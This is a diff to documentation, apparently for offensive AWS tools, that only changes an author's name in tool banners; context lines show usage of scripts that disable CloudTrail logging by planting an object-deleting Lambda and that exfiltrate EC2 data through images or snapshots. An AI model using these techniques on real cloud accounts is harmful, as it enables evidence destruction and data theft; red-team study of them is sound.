@@ -33,7 +33,7 @@ bash $ python3 disruptCloudTrailByS3Lambda.py --help
 
         :: AWS CloudTrail disruption via S3 Put notification to Lambda
         Disrupts AWS CloudTrail logging by planting Lambda that deletes S3 objects upon their creation
-        Mariusz B. / mgeeky '19, <mb@binary-offensive.com>
+        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
 
 usage: disruptCloudTrailByS3Lambda.py [options] <region> [trail_name]
 
@@ -64,7 +64,7 @@ bash $ python3 disruptCloudTrailByS3Lambda.py --access-key ASIAXXXXXXXXXXXXXXXX 
 
         :: AWS CloudTrail disruption via S3 Put notification to Lambda
         Disrupts AWS CloudTrail logging by planting Lambda that deletes S3 objects upon their creation
-        Mariusz B. / mgeeky '19, <mb@binary-offensive.com>
+        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
 
 [.] Will be working on Account ID: 712800000000
 [.] Step 1: Determine trail to disrupt
@@ -181,7 +181,7 @@ attacker $ python3 ./exfiltrate-ec2.py --help
 
         :: exfiltrate-ec2
         Exfiltrates EC2 data by creating an image of it or snapshot of it's EBS volume
-        Mariusz B. / mgeeky '19, <mb@binary-offensive.com>
+        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
 
 usage: ./exfiltrate-ec2.py [-h] [--region REGION] [--profile PROFILE]
                            [--access-key ACCESS_KEY] [--secret-key SECRET_KEY]
@@ -236,7 +236,7 @@ attacker $ python3 ./exfiltrate-ec2.py --region us-east-1 -v --profile default -
 
         :: exfiltrate-ec2
         Exfiltrates EC2 data by creating an image of it or snapshot of it's EBS volume
-        Mariusz B. / mgeeky '19, <mb@binary-offensive.com>
+        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
 
 [.] Using attacker's profile: default
 [.] Using victim's profile: victim-profile
